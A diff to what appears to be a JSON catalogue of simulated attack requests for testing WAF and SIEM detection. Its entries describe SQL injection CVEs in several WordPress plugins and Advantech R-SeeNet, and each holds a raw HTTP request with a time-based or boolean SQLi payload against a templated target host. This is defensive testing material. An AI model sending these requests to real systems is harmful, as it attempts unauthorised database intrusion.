@@ -417797,6 +417797,758 @@
     "visible": true
   },
   {
+    "name": "CVE-2021-24140 - Ajax Load More WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24140 - Ajax Load More WordPress Plugin SQL Injection",
+    "description": "The Ajax Load More WordPress plugin before 5.3.2 is vulnerable to authenticated SQL injection via the repeater parameter of the admin-ajax.php alm_get_posts action. The request sends a time-based blind payload (' or sleep(5)#) in repeater. Method and path taken from the CVE description; action=alm_get_posts is the plugin's registered AJAX handler added for correct request shape. No vendor WAF rule found; built from the CVE/WPScan description.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/1876312e-3dba-4909-97a5-afbb76fbc056 (WPScan advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-24140 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=alm_get_posts&repeater=%27+or+sleep(5)%23&type=test\n"
+    },
+    "cves": [
+      "CVE-2021-24140"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24140",
+        "link": "https://wpscan.com/vulnerability/1876312e-3dba-4909-97a5-afbb76fbc056"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24139 - Photo Gallery by 10Web WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24139 - Photo Gallery by 10Web WordPress Plugin SQL Injection",
+    "description": "The Photo Gallery by 10Web WordPress plugin before 1.5.55 is vulnerable to unauthenticated SQL injection via the bwg_search_x (e.g. bwg_search_0) frontend parameter handled in frontend/models/model.php. The request sends a time-based blind SQLi payload in bwg_search_0 against a page hosting a gallery (p=19 per the PoC). No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/2e33088e-7b93-44af-aa6a-e5d924f86e28 (WPScan advisory with sqlmap PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24139 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /?p=19&bwg_search_0=%27+AND+SLEEP(5)--+- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-24139"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24139",
+        "link": "https://wpscan.com/vulnerability/2e33088e-7b93-44af-aa6a-e5d924f86e28"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24138 - AdRotate WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24138 - AdRotate WordPress Plugin SQL Injection",
+    "description": "The AdRotate WordPress plugin before 5.8.4 is vulnerable to authenticated (admin+) SQL injection via the id parameter of the adrotate-statistics admin page (view=group). The request sends a time-based blind payload (1 AND SLEEP(5)) in id. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/aafac655-3616-4b27-9d0f-1cbc2faf0151 (WPScan advisory with PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24138 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=adrotate-statistics&view=group&id=1+AND+SLEEP(5) HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24138"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24138",
+        "link": "https://wpscan.com/vulnerability/aafac655-3616-4b27-9d0f-1cbc2faf0151"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24137 - Blog2Social WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24137 - Blog2Social WordPress Plugin SQL Injection",
+    "description": "The Blog2Social WordPress plugin before 6.3.1 is vulnerable to authenticated SQL injection in the Re-Share Posts feature via the postId parameter of the admin-ajax.php b2s_delete_re_post_sched action. The request sends a time-based blind payload (1 AND SLEEP(5)) in postId. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/9eb94e55-765b-4df5-baea-b247ef72aef3 (WPScan advisory with raw-request PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24137 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nCookie: wordpress_logged_in=dummy\n\naction=b2s_delete_re_post_sched&postId=1+AND+SLEEP(5)&b2s_security_nonce=dummy\n"
+    },
+    "cves": [
+      "CVE-2021-24137"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24137",
+        "link": "https://wpscan.com/vulnerability/9eb94e55-765b-4df5-baea-b247ef72aef3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24132 - Slider by 10Web WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24132 - Slider by 10Web WordPress Plugin SQL Injection",
+    "description": "The Slider by 10Web WordPress plugin before 1.2.36 is vulnerable to SQL injection in the bulk_action functionality (WDW_S_Library::get) on the sliders_wds admin page, via the check[] array key. The request injects a time-based payload as the array key (check[SLEEP(5)]). No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/c1f45000-6c16-4606-be80-1938a755af2c (WPScan advisory with raw-request PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24132 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin.php?page=sliders_wds HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\ns=&bulk_action=duplicate&check%5BSLEEP(5)%5D=on&select_slider_merge=-select-&imagesexport=on&nonce_wd=dummy&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dsliders_wds&task=duplicate&current_id=\n"
+    },
+    "cves": [
+      "CVE-2021-24132"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24132",
+        "link": "https://wpscan.com/vulnerability/c1f45000-6c16-4606-be80-1938a755af2c"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24131 - Anti-Spam by CleanTalk WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24131 - Anti-Spam by CleanTalk WordPress Plugin SQL Injection",
+    "description": "The Anti-Spam by CleanTalk WordPress plugin before 5.149 is vulnerable to authenticated (admin+) SQL injection in the removeLogs/removeSpam functions via the spamids[] parameter on the ct_check_users users admin page. The request sends a time-based blind payload (30) OR SLEEP(5)) in spamids[]. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/1bc28021-28c0-43fa-b89e-6b93c345e5d8 (WPScan advisory with raw-request PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24131 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/users.php?page=ct_check_users&ct_worked=1 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\n_wpnonce=dummy&_wp_http_referer=%2Fwp-admin%2Fusers.php%3Fpage%3Dct_check_users%26ct_worked%3D1&action=-1&paged=1&spamids%5B%5D=30)+OR+SLEEP(5)--+-&action2=delete\n"
+    },
+    "cves": [
+      "CVE-2021-24131"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24131",
+        "link": "https://wpscan.com/vulnerability/1bc28021-28c0-43fa-b89e-6b93c345e5d8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24130 - WP Google Map Plugin WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24130 - WP Google Map Plugin WordPress Plugin SQL Injection",
+    "description": "The WP Google Map Plugin WordPress plugin before 4.1.5 is vulnerable to authenticated (admin+) SQL injection on the Manage Locations page (wpgmp_manage_location) via the orderby (and order) parameters. The request sends a time-based blind payload (sleep(5)) in orderby. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/46af9a4d-67ac-4e08-a753-a2a44245f4f8 (WPScan advisory with PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24130 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=wpgmp_manage_location&order=desc&orderby=%28sleep%285%29%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24130"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24130",
+        "link": "https://wpscan.com/vulnerability/46af9a4d-67ac-4e08-a753-a2a44245f4f8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24125 - Contact Form Submissions WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24125 - Contact Form Submissions WordPress Plugin SQL Injection",
+    "description": "The Contact Form Submissions WordPress plugin before 1.7.1 is vulnerable to authenticated (admin+) SQL injection via the wpcf7_contact_form GET parameter when submitting a filter request on the submissions list (edit.php?post_type=wpcf7s). The request sends a subquery time-based payload (SELECT ... SLEEP(5)) in wpcf7_contact_form. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/8591b3c9-b041-4ff5-b8d9-6f9f81041178 (WPScan advisory with PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24125 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/edit.php?post_status=all&post_type=wpcf7s&wpcf7_contact_form=%28SELECT+42+FROM+%28SELECT%28SLEEP%285%29%29%29aa%29&filter_action=Filter&paged=1 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24125"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24125",
+        "link": "https://wpscan.com/vulnerability/8591b3c9-b041-4ff5-b8d9-6f9f81041178"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21931 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21931 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'stat_filter' parameter of the device_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the stat_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21931 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/device_list.php?stat_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21931"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21931",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21931",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21930 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21930 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'sn_filter' parameter of the device_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the sn_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21930 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/device_list.php?sn_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21930"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21930",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21930",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21929 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21929 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'prod_filter' parameter of the device_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the prod_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21929 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/device_list.php?prod_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21929"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21929",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21929",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21928 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21928 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'mac_filter' parameter of the device_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the mac_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21928 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/device_list.php?mac_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21928"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21928",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1366"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21928",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21923 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21923 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'company_filter' parameter of the company_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the company_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21923 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/company_list.php?company_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21923"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21923",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21923",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21922 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21922 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'username_filter' parameter of the user_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the username_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21922 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/user_list.php?username_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21922"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21922",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21922",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21921 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21921 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'name_filter' parameter of the user_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the name_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21921 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/user_list.php?name_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21921"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21921",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21921",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-21920 - Advantech R-SeeNet SQL Injection",
+    "displayName": "CVE-2021-21920 - Advantech R-SeeNet SQL Injection",
+    "description": "Advantech R-SeeNet (versions 2.4.16 and prior) is vulnerable to authenticated SQL injection via the 'surname_filter' parameter of the user_list.php page. The request sends a boolean SQL injection payload (' OR 1=1-- -) in the surname_filter parameter, matching OWASP CRS 942 (SQLi). No vendor WAF rule found; built from the Talos and CISA advisories. Exact page path derived from the advisory page names and R-SeeNet's /php/ web directory; HTTP method GET is inferred for this DataTables filter/list endpoint (flagged).\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365 (Talos advisory, names the vulnerable page and parameter)\n- https://www.cisa.gov/ics/advisories/icsa-21-348-01 (CISA ICS advisory icsa-21-348-01, lists affected pages/versions)\n- https://www.cve.org/CVERecord?id=CVE-2021-21920 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /php/user_list.php?surname_filter=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-21920"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_talos for CVE-2021-21920",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1365"
+      },
+      {
+        "title": "advisory_cisa for CVE-2021-21920",
+        "link": "https://www.cisa.gov/ics/advisories/icsa-21-348-01"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-5019 - code-projects Simple Food Order System SQL Injection",
     "displayName": "CVE-2026-5019 - code-projects Simple Food Order System SQL Injection",
     "description": "code-projects Simple Food Order System 1.0 is vulnerable to SQL injection via the Status argument of all-orders.php (Parameter Handler). The request sends a time-based SQL injection payload (AND SLEEP(5)) in the Status parameter, triggering OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the VulDB entry-point description (file all-orders.php, argument Status). Method is inferred GET (status is a listing/filter parameter), matching the sibling code-base CVE-2022-42990 which used all-orders.php?status=.\n\nReferences used to recreate this request:\n- https://github.com/6Justdododo6/CVE/issues/17 (PoC, not reachable in this session)\n- https://vuldb.com/vuln/353904 (VulDB entry: file + argument)\n- https://www.cve.org/CVERecord?id=CVE-2026-5019 (CVE record)",
@@ -418342,6 +419094,280 @@
       {
         "title": "vuldb for CVE-2026-4876",
